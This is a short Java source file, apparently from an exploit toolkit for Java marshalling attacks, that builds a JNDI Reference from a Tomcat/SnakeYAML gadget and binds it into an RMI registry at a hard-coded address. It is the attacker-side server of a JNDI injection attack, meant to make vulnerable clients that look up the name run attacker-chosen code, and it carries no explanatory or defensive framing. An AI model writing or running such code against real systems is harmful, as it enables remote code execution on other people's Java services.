package xyz.eki.marshalexp.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import xyz.eki.marshalexp.gadget.jndi.GSnakeYaml;

import javax.naming.Reference;
import java.rmi.Naming;

public class Bind {
    public static void main(String[] args) throws Exception{
        Reference ref = GSnakeYaml.tomcat_snakeyaml();
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);

        Naming.bind("rmi://192.168.31.82:8883/123",referenceWrapper);
    }
}
